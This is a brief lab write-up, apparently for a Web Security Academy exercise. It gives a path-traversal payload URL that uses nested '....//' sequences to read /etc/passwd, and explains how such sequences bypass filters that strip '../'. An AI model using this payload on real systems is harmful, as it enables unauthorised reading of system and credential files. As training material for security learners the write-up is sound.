Use the following payload:
```
https://ac631f491ff3ef5dc03220e000790093.web-security-academy.net/image?filename=....//....//....//etc/passwd
```
Note: If an application strips or blocks directory traversal sequences from the user-supplied filename, then it might be possible to bypass the defense using a variety of techniques. You might be able to use nested traversal sequences, such as `....//` or `....\/`, which will revert to simple traversal sequences when the inner sequence is stripped.
